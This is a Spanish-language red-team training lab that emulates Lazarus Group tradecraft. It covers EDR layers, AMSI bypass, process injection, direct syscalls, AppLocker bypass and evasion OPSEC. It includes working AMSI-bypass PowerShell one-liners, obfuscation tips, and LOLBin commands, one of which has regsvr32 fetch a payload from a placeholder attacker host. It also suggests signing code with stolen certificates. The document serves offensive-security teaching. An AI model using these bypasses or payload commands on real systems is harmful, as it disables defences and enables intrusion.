# Tradecraft — Operación GHOST SIGNAL
## Lab-08: EDR Evasion, AMSI Bypass y Process Injection

**Operación:** GHOST SIGNAL | **Adversario:** Lazarus Group | **Nivel:** Red Team Operations  
**Autor:** Adrián Camacho | **Versión:** 1.0 | **Fecha:** Mayo 2026

---

## Índice

1. [EDR — Cómo funciona la detección moderna](#1-edr)
2. [AMSI — Anti-Malware Scan Interface](#2-amsi)
3. [Process Injection — Técnicas y detección](#3-process-injection)
4. [Direct Syscalls — Bypassing API Hooking](#4-direct-syscalls)
5. [AppLocker Bypass](#5-applocker-bypass)
6. [PE Evasion — Ofuscación de ejecutables](#6-pe-evasion)
7. [OPSEC — Lazarus Group TTPs de evasión](#7-opsec)

---

## 1. EDR — Cómo funciona la detección moderna

### Capas de detección de un EDR moderno

Un EDR moderno (Defender for Endpoint, CrowdStrike, SentinelOne) detecta malware en múltiples capas:

```
Capa 1: Firma estática — hash del archivo, strings, patrones de bytes
Capa 2: AMSI — escaneo de scripts en memoria antes de ejecución
Capa 3: API Hooking — intercepción de llamadas a la API de Windows
Capa 4: ETW — telemetría de eventos del kernel
Capa 5: Behavioral — análisis de comportamiento en tiempo real
Capa 6: ML — modelos de machine learning sobre patrones de comportamiento
```

### Por qué la evasión de EDR es más compleja que evadir AV

Un AV clásico solo opera en Capa 1 (firmas estáticas). Un EDR moderno opera en todas las capas simultáneamente. Bypassar una capa no garantiza bypassar las demás.

### API Hooking — La base de la detección de comportamiento

Los EDR modernos "hookean" las APIs de Windows (especialmente las relacionadas con memoria y procesos) para interceptar llamadas sospechosas:

```
Proceso → ntdll.dll (hookeada por EDR) → kernel
                ↑
         EDR intercepta aquí y analiza parámetros
```

APIs típicamente hookeadas:
- `NtAllocateVirtualMemory` — asignación de memoria
- `NtWriteVirtualMemory` — escritura en memoria de otro proceso
- `NtCreateThreadEx` — creación de threads
- `NtOpenProcess` — apertura de handle a proceso
- `VirtualProtect` — cambio de permisos de memoria

---

## 2. AMSI — Anti-Malware Scan Interface

### ¿Qué es AMSI?

AMSI (Anti-Malware Scan Interface) es una API de Windows que permite a las aplicaciones (PowerShell, VBScript, JScript, WSH, .NET) enviar contenido al proveedor AV/EDR instalado para que lo escanee **antes de ejecutarlo**.

### Flujo de AMSI en PowerShell

```
PowerShell recibe script
    ↓
AmsiScanBuffer() → envía contenido a AV/EDR
    ↓
AV/EDR: ¿es malicioso?
    ├── NO → PowerShell ejecuta
    └── SÍ → PowerShell lanza excepción "This script contains malicious content"
```

### Por qué AMSI es importante

Sin bypassar AMSI, cualquier script conocido (PowerView, Rubeus, SharpHound, etc.) será bloqueado en PowerShell aunque esté en memoria. AMSI escanea el contenido **en memoria**, no solo en disco.

### Bypass de AMSI — Técnicas principales

#### Patching AmsiScanBuffer en memoria

```powershell
# Parchear AmsiScanBuffer para que siempre retorne AMSI_RESULT_CLEAN
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};
$d=$c.GetFields('NonPublic,Static');
Foreach($e in $d) {if ($e.Name -like "*itFailed") {$f=$e}};
$f.SetValue($null,$true)
```

#### Reflection para modificar amsiContext

```powershell
# Método alternativo via reflection
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)
```

#### Técnica de ofuscación (evitar detección del bypass)

Los bypasses conocidos están en las firmas del EDR. Es necesario ofuscarlos:

```powershell
# Concatenación para evitar detección de strings
$a = "Am" + "siUtils"
$b = "amsi" + "Context"
# ... etc
```

### AMSI y .NET

.NET 4.8+ también implementa AMSI para Assembly.Load(). Los beacons en memoria que se cargan via reflection también son escaneados.

---

## 3. Process Injection — Técnicas y detección

### ¿Por qué inyectar en otro proceso?

La inyección de código en otro proceso permite:
1. **Evasión de AV** — el código malicioso se ejecuta bajo un proceso legítimo
2. **Persistencia** — el código vive mientras el proceso host esté activo
3. **Privilegios** — inyectar en un proceso privilegiado hereda sus privilegios
4. **Network bypass** — el tráfico de red aparece como del proceso legítimo

### Técnicas clásicas y su detección

#### CreateRemoteThread (clásico — altamente detectado)

```
VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
```

EDR detecta: API sequence, thread creado por proceso externo.

#### Process Hollowing

```
Crear proceso suspendido → vaciar memoria → escribir payload → reanudar
```

EDR detecta: proceso con sección de código reemplazada (CreateProcess + NtUnmapViewOfSection + WriteProcessMemory).

#### Module Stomping

```
Cargar DLL legítima → sobrescribir su sección .text con payload
```

EDR detecta: módulo con hash diferente al esperado (costoso de detectar).

#### Thread Hijacking

```
OpenThread → SuspendThread → GetThreadContext → SetThreadContext → ResumeThread
```

EDR detecta: contexto de thread modificado externamente.

#### Process Ghosting / Herpaderping (técnicas modernas)

Modifican el ejecutable en disco mientras está siendo mapeado por el kernel, resultando en un proceso cuyo imagen en disco no coincide con lo que está en memoria. Extremadamente difícil de detectar.

### Early Bird APC Injection

Inyecta código via APC (Asynchronous Procedure Call) antes de que el proceso haya inicializado completamente — antes de que el EDR haya hookado las APIs.

```
CreateProcess (suspended) → QueueUserAPC (payload) → ResumeThread
→ Payload ejecuta antes de que AMSI/EDR se inicialice en el proceso
```

---

## 4. Direct Syscalls — Bypassing API Hooking

### El problema con ntdll.dll hookeada

Los EDR hookean funciones en `ntdll.dll` para interceptar llamadas al kernel. Si llamamos directamente al kernel via syscalls, bypassamos completamente los hooks del EDR.

### ¿Qué son los syscalls directos?

Cada función de ntdll.dll (como `NtAllocateVirtualMemory`) es un wrapper que:
1. Carga el número de syscall en EAX
2. Ejecuta la instrucción `syscall` para entrar al kernel

Un syscall directo ejecuta estos pasos manualmente, sin pasar por ntdll.dll.

```asm
; NtAllocateVirtualMemory directo
mov r10, rcx
mov eax, 0x18      ; syscall number para NtAllocateVirtualMemory
syscall
ret
```

### El problema: syscall numbers varían por versión de Windows

El número de syscall de cada función varía entre versiones de Windows. Soluciones:

1. **Hardcoded numbers** — tabla estática por versión (SysWhispers2)
2. **Dynamic resolution** — leer el número del ntdll en disco (no hookeado)
3. **HellsGate** — obtener syscall number de ntdll en memoria antes del hook
4. **HalosGate** — si la función está hookeada, buscar el número en funciones adyacentes

### SysWhispers3 — La herramienta estándar

```bash
# Generar syscalls para funciones específicas
python3 syswhispers.py --functions NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx --out-file syscalls
```

Genera archivos `.asm` y `.h` que se incluyen en el proyecto para llamar directamente al kernel.

---

## 5. AppLocker Bypass

### ¿Qué es AppLocker?

AppLocker es una feature de Windows que permite definir políticas de qué aplicaciones pueden ejecutarse, basándose en:
- Hash del archivo
- Ruta del archivo
- Firma del editor (publisher)

### Bypasses comunes

#### LOLBins (Living-off-the-Land Binaries)

Binarios firmados por Microsoft que pueden ejecutar código arbitrario:

```powershell
# MSBuild — compila y ejecuta C# inline
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# Regsvr32 (Squiblydoo)
regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll

# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication "..."

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

#### Directorios permitidos por defecto

AppLocker por defecto permite ejecutar desde:
- `C:\Windows\`
- `C:\Program Files\`
- `C:\Program Files (x86)\`

Si `C:\Windows\Tasks\` o `C:\Windows\Temp\` están permitidos, se puede copiar el payload ahí.

#### Bypass via DLL

Si las reglas de AppLocker solo se aplican a `.exe` pero no a `.dll`, se puede ejecutar código via `rundll32` o cargando una DLL en un proceso permitido.

---

## 6. PE Evasion — Ofuscación de ejecutables

### Por qué las firmas estáticas detectan beacons

Los beacons de C2 (Sliver, Havoc, Cobalt Strike) tienen patrones de bytes únicos que los AV/EDR detectan. La evasión estática busca modificar esos patrones.

### Técnicas de evasión estática

#### Cifrado del payload

```
Payload → XOR/AES cifrado → stub de descifrado → en tiempo de ejecución descifra y ejecuta
```

El stub de descifrado es pequeño y no tiene patrones maliciosos. El payload cifrado no es reconocible.

#### Stomping de strings

Las herramientas de análisis buscan strings reconocibles (URLs de C2, nombres de APIs). Cifrar o fragmentar estos strings evita la detección estática.

#### Cambiar el Import Address Table (IAT)

Las APIs importadas por el PE son una firma. Cargar APIs dinámicamente en runtime (`GetProcAddress`) en lugar de importarlas estáticamente evita su detección en el IAT.

### Artifact Kit (concepto de Cobalt Strike, aplicable a Sliver/Havoc)

El Artifact Kit permite personalizar el stub que carga el beacon en memoria — cambiando los patrones de bytes que los AV detectan. El equivalente en Sliver son los **armory templates**.

---

## 7. OPSEC — Lazarus Group TTPs de evasión

### Perfil de Lazarus Group

Lazarus Group (DPRK) es conocido por:
- Payloads multicapa con cifrado y ofuscación avanzada
- Uso de herramientas legítimas como LOLBins
- C2 sobre HTTPS con certificados válidos imitando sitios legítimos
- Persistencia discreta via COM hijacking y DLL side-loading
- Exfiltración lenta y metódica para evitar detección por volumen

### Principios de evasión aplicados en este lab

1. **No tocar disco** — payloads en memoria siempre que sea posible
2. **Firmar código** — usar certificados robados o auto-firmados para parecer legítimos
3. **Imitar procesos legítimos** — inyectar en `explorer.exe`, `svchost.exe`, `RuntimeBroker.exe`
4. **Sleep obfuscation** — cifrar el beacon en memoria durante los sleep intervals
5. **ETW patching** — deshabilitar la telemetría ETW que reporta al EDR

### Sleep Obfuscation — Por qué importa

Un beacon durmiente en memoria puede ser detectado por escaneo de memoria (el EDR busca patrones conocidos en todas las regiones de memoria). Sleep obfuscation cifra el beacon durante el sleep:

```
Beacon activo → ejecuta C2 comms → sleep
              → cifra su propia memoria
              → duerme N segundos
              → se descifra → ejecuta C2 comms
```

Herramientas como **Ekko** y **Zilean** implementan sleep obfuscation compatible con Cobalt Strike/Havoc.

---

## Referencias

- [AMSI bypass techniques — S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
- [SysWhispers3 GitHub](https://github.com/klezVirus/SysWhispers3)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [MITRE ATT&CK — Lazarus Group](https://attack.mitre.org/groups/G0032/)
- [Sektor7 — Malware Development](https://institute.sektor7.net/)

---

*Operación GHOST SIGNAL — Adrián Camacho | Mayo 2026*  
*Entorno de laboratorio — Únicamente con fines educativos*